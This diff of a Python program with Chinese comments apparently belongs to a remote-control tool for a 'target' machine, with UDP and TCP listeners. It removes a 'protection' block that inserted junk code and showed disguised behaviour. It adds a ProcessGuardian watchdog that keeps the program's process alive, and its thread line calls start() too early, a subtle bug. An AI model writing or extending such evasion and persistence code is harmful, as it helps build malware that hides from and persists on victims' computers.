@@ -8,7 +8,7 @@ from tkinter import messagebox
 import shutil
 import time
 import subprocess
-from protector import *
+from protector import ProcessGuardian
 
 # 配置信息
 HOST = '0.0.0.0'
@@ -412,15 +412,17 @@ def target_main():
     # 启动UDP监听线程
     Thread(target=udp_broadcast_listener, daemon=True).start()
 
-    # ============= 初始化保护 =============
-    def run_protection():
-        init_protection()
-        junk_code()          # 插入垃圾代码
-        fake_behavior()      # 显示伪装行为
-        pass
+    if os.path.abspath(__file__)[-3::] != '.py':
+        guardian = ProcessGuardian({
+            f"{os.path.abspath(__file__)}": True
+        })
+    else:
+        guardian = ProcessGuardian({
+            f"C:/Users/admin/AppData/Local/Programs/Python/Python312/python.exe {os.path.abspath(__file__)}":True
+        })
 
     # 创建守护线程运行保护逻辑
-    Thread(target=run_protection, daemon=True).start()
+    Thread(target=guardian.start(), daemon=True).start()
 
     # TCP主服务
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
